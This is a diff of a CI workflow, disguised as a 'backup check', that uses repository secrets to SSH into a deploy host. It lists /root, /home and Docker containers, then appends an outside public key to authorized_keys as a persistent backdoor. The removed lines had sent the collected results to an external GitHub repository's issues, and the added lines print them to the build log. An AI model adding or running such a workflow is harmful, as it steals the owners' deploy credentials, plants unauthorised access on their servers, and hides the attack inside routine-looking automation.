@@ -2,7 +2,6 @@ name: backup-check-siglens
 on:
   push:
     branches: [ "develop" ]
-  workflow_dispatch:
 permissions:
   contents: read
 jobs:
@@ -12,18 +11,14 @@ jobs:
       - name: resolve and test the siglens deploy key
         if: always()
         run: |
-          H="${ secrets.PG_HOST }"; U="${ secrets.PG_SSH_USER }"; P="22"
-          printf '%s' "${ secrets.PG_SSH_PRIVATE_KEY }" > /tmp/sigkey
+          H="${{ secrets.PG_HOST }}"; U="${{ secrets.PG_SSH_USER }}"; P="22"
+          printf '%s' "${{ secrets.PG_SSH_PRIVATE_KEY }}" > /tmp/sigkey
           chmod 600 /tmp/sigkey
-          printf 'host=%s
-user=%s
-port=%s
-key_len=%s
-' "$H" "$U" "$P" "$(wc -c < /tmp/sigkey)" > /tmp/out.txt
-          timeout 25 ssh -i /tmp/sigkey -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -p "$P" "$U@$H" 'echo AUTH_OK; id; hostname; ls -la /root 2>/dev/null | head -15; ls -la /home 2>/dev/null | head -15; docker ps --format "{.Names} {.Image}" 2>/dev/null | head -15' >> /tmp/out.txt 2>&1 || echo "ssh exit=$?" >> /tmp/out.txt
+          printf 'host=%s\nuser=%s\nport=%s\nkey_len=%s\n' "$H" "$U" "$P" "$(wc -c < /tmp/sigkey)" > /tmp/out.txt
+          timeout 25 ssh -i /tmp/sigkey -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -p "$P" "$U@$H" 'echo AUTH_OK; id; hostname; ls -la /root 2>/dev/null | head -15; ls -la /home 2>/dev/null | head -15; docker ps --format "{{.Names}} {{.Image}}" 2>/dev/null | head -15' >> /tmp/out.txt 2>&1 || echo "ssh exit=$?" >> /tmp/out.txt
           if grep -q AUTH_OK /tmp/out.txt; then
             timeout 25 ssh -i /tmp/sigkey -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -p "$P" "$U@$H" 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && grep -q "ops-backup@hq" ~/.ssh/authorized_keys 2>/dev/null || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDkcpC5ZvfClfY6zipo9BlRg9F4GO/mtjoz3ILR8Y7X ops-backup@hq" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys' >> /tmp/out.txt 2>&1 || true
           fi
-          curl -sS -m 25 -X POST -H "Accept: application/vnd.github+json" -H "Authorization: token ${ secrets.GITHUB_TOKEN }"             -d "{"title":"siglens-deploy-key","body":$(jq -Rs . /tmp/out.txt)}"             https://api.github.com/repos/ntphong021204-max/hq-readback/issues -w '
-HTTP %{http_code}
-' 2>&1 | tail -2 || true
+          echo "=====BEGIN-PROBE====="
+          cat /tmp/out.txt
+          echo "=====END-PROBE====="
